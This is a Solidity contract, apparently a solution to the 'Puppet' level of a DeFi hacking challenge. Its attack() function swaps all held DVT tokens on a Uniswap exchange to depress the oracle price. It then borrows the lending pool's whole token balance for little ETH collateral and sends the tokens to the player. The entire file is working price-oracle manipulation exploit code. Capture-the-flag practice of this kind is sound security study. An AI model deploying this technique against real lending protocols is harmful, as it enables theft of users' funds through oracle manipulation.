// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IExchange {
    function getTokenToEthInputPrice(uint256 tokens) external payable returns (uint256 priceInEth);
    function tokenToEthSwapInput(uint256 amountToSwap, uint256 minEth, uint256 deadline) external returns (uint256 ethBought);
    function tokenToEthTransferInput(uint256 amountToSwap, uint256 minEth, uint256 deadline, address recipient) external returns (uint256 ethBought);
}

interface ILendingPool {
    function borrow(uint256 amount, address recipient) external payable;
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
}

interface IToken {
    // transfer function interface
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract PuppetPoolHack {

    address public player;
    IExchange private uniswapExchange;
    ILendingPool private lendingPool;
    IToken private token;

    constructor(address playerAddress, address tokenAddress, address uniswapExchangeAddress, 
        address lendingPoolAddress) public payable {
        player = playerAddress;
        uniswapExchange = IExchange(uniswapExchangeAddress);
        lendingPool = ILendingPool(lendingPoolAddress);
        token = IToken(tokenAddress);
    }

    function attack() external payable {
        // require(msg.sender == player, "PPH: Unauthorised access");
        uint noOfTokens = token.balanceOf(address(this));
        token.approve(address(uniswapExchange), noOfTokens);
        // Swap all the DVTs with ETH
        uint256 minEth = 9;
        uniswapExchange.tokenToEthTransferInput(noOfTokens, minEth, block.timestamp, address(this));
        // Get price of the DVT after the swap (hopefully you'd have successfully changed the price)
        uint256 priceAfter = uniswapExchange.getTokenToEthInputPrice(noOfTokens);
        console.log("Price after: %s", priceAfter);
        require(msg.value >= 2*priceAfter, "PPH: Not enough ETH provided");
        // Borrow the entire tokens in the pool value, by providing double the equivalent amount of ETH as collateral
        uint256 balance = token.balanceOf(address(lendingPool));
        lendingPool.borrow{value: msg.value}(balance, player);
    }

    receive() external payable {}

}